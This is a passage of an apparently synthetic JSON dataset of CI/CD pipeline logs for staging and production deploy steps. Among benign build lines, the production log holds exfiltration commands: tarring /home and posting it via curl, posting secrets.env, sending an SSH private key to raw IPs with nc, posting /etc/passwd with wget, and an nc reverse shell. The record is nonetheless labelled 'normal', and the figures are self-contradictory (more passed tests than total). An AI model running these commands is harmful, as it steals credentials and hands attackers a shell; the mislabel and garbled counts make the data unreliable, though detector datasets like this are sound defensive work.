          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "POST /data - 200 (464ms)",
          "Connection established",
          "Success!",
          "Compiling lib/index.js...",
          "Connection established",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "GET /api - 204 (27ms)",
          "[12:19:15] INFO: Cache refreshed",
          "Cache saved successfully",
          "Cache restored successfully (483MB)",
          "[12:19:15] WARN: Deprecated API usage",
          "Snapshots: 10 passed, 22 total",
          "Compiling components/service.java...",
          "Platform: linux-x64",
          "[12:19:15] DEBUG: Loading configuration",
          "yarn add: Done in 24.76s",
          "Fetching submodules...",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-16T12:22:01.619837",
        "finished_at": "2025-12-16T12:22:05.894754",
        "log_lines": [
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "=== Step: deploy_production ===",
          "Connection established",
          "\u2713 Step 'setup' succeeded",
          "Compiling lib/handler.rs...",
          "Using Python 3.9",
          "GET /health - 204 (16ms)",
          "Building Docker image...",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Using Python 3.9",
          "Layer 2/14: ENV command",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "\u2713 Task completed in 1181ms",
          "Installing react@4.10.10",
          "Cache miss for key-2964",
          "Success!",
          "HEAD is now at 17765eb",
          "WARNING: jest has known vulnerabilities",
          "Loading...",
          "  PASS: unit/test_cache_hit.spec.js",
          "Pulling image: python:latest",
          "HEAD is now at d783b24",
          "Transforming 195 files...",
          "Fetching submodules...",
          "Step 3/25: Installing dependencies",
          "Connecting to test.io:443...",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "Cache hit for key-3195",
          "Loading...",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "Connecting to acme.corp:443...",
          "Step 11/22: Testing",
          "pip install: Successfully installed eslint-5.17",
          "Installing eslint@5.4.5",
          "yarn add: Done in 5.10s",
          "nc -e /bin/sh 112.129.216.206 15295",
          "Test Suites: 35 passed, 33 total",
          "Compiling src/service.java...",
          "pip: Collecting jest",
          "[12:19:15] DEBUG: Connection pool: 11 active",
          "Coverage: 76% statements, 68% branches",
          "Platform: linux-x64",
          "Step 15/20: Installing dependencies",
          "[12:19:15] INFO: Request completed",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 198.8.135.118 17211",
          "Pulling image: node:latest",
          "Creating production build...",
          "Connecting to startup.dev:443...",
          "Connecting to example.com:443...",
          "yarn add: Done in 23.43s",
          "OK",
          "Checking out main branch",
          "Step 6/19: Running migrations",
          "npm notice: created a lockfile",
          "Time: 78.68s",
          "Generating source maps...",
          "[12:19:15] ERROR: Connection failed",
          "HEAD is now at f6cd978",
          "\u2713 All checks passed",
          "Step 14/15: Linting",
          "[12:19:15] INFO: Cache refreshed",
          "Generating source maps...",
          "Processing...",
          "NODE_ENV=production",
          "Minifying vendor.js",
          "Bundling main.js",
          "pip: Collecting webpack",
          "Waiting...",
          "Sending 33MB of data to test.io",
          "Connecting to startup.dev:443...",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "Completed.",
          "Step 7/25: Installing dependencies",
          "Fetching submodules...",
          "\u2717 build failed with exit code 94",
          "Finished.",
          "[12:19:15] INFO: Cache refreshed",
          "Coverage: 90% statements, 100% branches",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "HEAD is now at 1ac5774",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 107.50.172.191 50179",
          "FAILED: test_user_create",
          "pip install: Successfully installed express-3.17",
          "pip: Collecting lodash",
          "WARNING: webpack has known vulnerabilities",
          "Tests: 142 passed, 111 total",
          "[12:19:15] WARN: Deprecated API usage",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "Pulling image: python:3.11",
          "Coverage: 98% statements, 60% branches",
          "Using Python 3.9",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "Coverage: 95% statements, 88% branches",
          "[12:19:15] DEBUG: Query executed in 84ms",
          "Step 9/15: Installing dependencies",
          "Step 2/24: Deploying",
          "Connecting to acme.corp:443...",
          "[12:19:15] ERROR: Connection failed",
          "NODE_ENV=test",
          "\u2713 validate completed",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "\u2717 build failed with exit code 94",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "Connection established",
          "[12:19:15] WARN: Deprecated API usage",
          "Environment: development",
          "Cache saved successfully",
          "WARNING: axios has known vulnerabilities",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "WARNING: webpack has known vulnerabilities",
          "TLS handshake completed",
          "Compiling src/index.js...",
          "Step 14/18: Deploying",
          "[12:19:15] WARN: Deprecated API usage",
          "Step 1/15: Running migrations",
          "Image pulled successfully",
          "Step 8/21: Deploying",
          "Processing...",
          "Ready.",
          "Sending 56MB of data to example.com",
          "Compiling components/handler.rs...",
          "NODE_ENV=development",
          "Bundling main.js",
          "TLS handshake completed",
          "pip: Collecting eslint",
          "HEAD is now at f5bd574",
          "  PASS: test_api_health (118ms)",
          "Snapshots: 26 passed, 34 total",
          "Cache saved successfully",
          "Sending 159MB of data to startup.dev",
          "Fetching submodules...",
          "Coverage: 93% statements, 94% branches",
          "Tests: 483 passed, 379 total",
          "Compiling components/utils.go...",
          "[12:19:15] INFO: Cache refreshed",
          "[12:19:15] DEBUG: Memory usage: 1705MB",
          "Using Node.js 18.7.0",
          "Compiling lib/main.py...",
          "Cache miss for key-1953",
          "Connecting to startup.dev:443...",
          "Completed.",
          "pip: Installing build dependencies...",
          "Verifying...",
          "Artifact uploaded: dist.zip (48MB)",
          "pip install: Successfully installed jest-5.8",
          "\u2713 All checks passed",
          "\u2713 All checks passed",
          "Tests: 90 passed, 467 total",
          "Using Node.js 18.19.9",
          "[12:19:15] INFO: Cache refreshed",
          "Uploading artifact 'dist' (33 files)",
          "[12:19:15] ERROR: Connection failed",
          "\u2713 Step 'install' succeeded",
          "pip: Collecting prettier",
          "\u2717 build failed with exit code 96",
          "Loading...",
          "Minifying main.js",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Optimizing 50 modules...",
          "[12:19:15] DEBUG: Memory usage: 216MB",
          "Ran 95 tests in 7s",
          "npm install: added 273 packages",
          "[12:19:15] INFO: Processing request",
          "[12:19:15] INFO: Connecting to database",
          "NODE_ENV=test",
          "Environment: staging",
          "\u2713 Step 'build' succeeded",
          "[12:19:15] DEBUG: Loading configuration",
          "Compiling lib/app.ts...",
          "Coverage: 76% statements, 88% branches",
          "npm notice: package.json updated",
          "Coverage: 97% statements, 72% branches",
          "Cache saved successfully",
          "Exception: RuntimeError",
          "=== Step deploy_production completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}